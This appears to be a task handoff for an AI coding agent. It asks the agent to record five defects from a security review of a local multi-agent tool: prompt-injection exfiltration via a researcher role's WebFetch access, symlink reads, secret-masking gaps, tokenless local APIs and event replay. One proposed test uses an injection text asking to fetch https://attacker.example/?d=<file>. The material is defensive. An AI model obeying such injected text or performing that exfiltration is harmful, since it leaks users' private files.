Найдено: … Пункт планки: …», then the sections the recent files have; text in Russian as the other defect files). Source: an external security review of Sai, relayed to ORCH on 2026-11-18 by another local Claude session of the owner as the owner's word; the reviewer used only artificial values and localhost; nothing real leaked. Write the review's statements as statements of the review («по словам проверки»), not as facts: check yourself, by reading only, that every file and line the review names exists and holds what it says, and write in the file what you saw (or the difference); the diagnosis is ISSUE-FIXER's work in each defect's own WF-03 run. «Найдено: внешняя проверка безопасности (передано ORCH 2026-11-18 другой сессией владельца)»; no name of the reviewer, no other project, no machine path. Severity as proposed by ORCH (the diagnosis may change it): ISS-0119 HIGH, ISS-0120 HIGH, ISS-0121 MEDIUM, ISS-0122 MEDIUM, ISS-0123 LOW; the quality-bar item you choose from docs/quality-bar.md with its reason. Order and content: (1) ISS-0119 — prompt-injection exfiltration through the researcher role (not reproduced on a model): tools/src/team/role-internal.js line 24 gives the researcher file tools plus WebSearch and WebFetch; tools/src/team/executors/claude-cli.js lines 31-37 deny only local addresses (a deny list); data can leave in the URL of a plain GET. Acceptance proposed by the review: a role that reads untrusted text and has network tools cannot read anything outside its run's project root, and WebFetch is an allow list (deny by default), or the roles are split (a web role without file access, a file role without network); a test pins the launch arguments of every role with web tools; a test with an injection text asking to fetch https://attacker.example/?d=<file> shows the domain is refused. (2) ISS-0120 — a symlinked source read outside the project: a docs/context.md planted as a link to a file outside the project was copied by prepare-run into the run materials; git stores symlinks, so a cloned foreign repository is enough. Acceptance: prepare-run resolves the real path of every source it reads and refuses, with a named message and a non-zero exit, any file whose real path is outside the project root; a test with a link to an outside file: refused, the contents absent from the run materials; a link inside the root still works. (3) ISS-0121 — the secret masking misses: tools/src/pixel-office/mask.js and the second masking function (the review says «both functions»; find which one it means and name it) miss `password = "..."` (spaces around =) and `redis://:secret@host`, while `password="..."` is caught. Acceptance: both functions mask key = value with any spaces around = and :, and any scheme://user:pass@host and scheme://:pass@host; the old cases stay masked; benign twins (no secret) are not changed. (4) ISS-0122 — local read APIs without a token: GET /api/events of tools/src/pixel-office/server.js and GET /api/projects of tools/src/web/api.js answer 200 with stored text to any local process; request texts are stored by default (SAI_PIXEL_OFFICE_STORE_TEXT); the servers listen on 127.0.0.1 and a foreign Host gets 403. Acceptance: the read endpoints of Pixel Office and Team Web need a per-start random token (in a file readable only by the owner, mode 0600) or the existing page key; without it 401 or 403; the page still works in the browser; lower risk on a one-person computer, matters on a shared one; an owner question: the default of SAI_PIXEL_OFFICE_STORE_TEXT. (5) ISS-0123 — replay of a signed event: the same signed POST /api/events sent twice got 204 twice and two journal lines; the HMAC and the time check pass, uniqueness is not checked. Acceptance: a second request with the same event id or nonce inside the time window is refused (for example 409), the journal has one line; a test pins it. In each file also: the review's good measures it named (HMAC on writes, Origin and page-key checks, CSP, no shell, a trimmed environment, budget and timeouts, no runtime npm dependencies, no sign of hidden sending) only where they bear on that defect; the review's advice for now (a separate virtual machine with depersonalised data, SAI_TEAM_WEB=0, SAI_PIXEL_OFFICE_STORE_TEXT=0) in ISS-0119 and ISS-0122; the open question to the reviewer (which part of the code was reviewed, whether anything was checked on Windows). SAFETY: read only — do not run any program of tools/, do not start Pixel Office, its hook or a team server, never set SAI_TEAM_REAL_RUNS, never start the real claude, never import a program file to read it, never touch the real Pixel Office state folder; a command denied by the permission check is not done another way. Change no project file other than the five new files docs/issues/ISS-0119-…md … ISS-0123-…md and this handoff (no STATE.md, no PLAN.md, no requirements, no other defect file); no commit, push or pull. The files and the handoff hold no absolute machine paths, no temporary paths and no names of other projects of the owner; run node src/handoffs/cli.js and node src/traces/cli.js from tools/ before close (both 0).
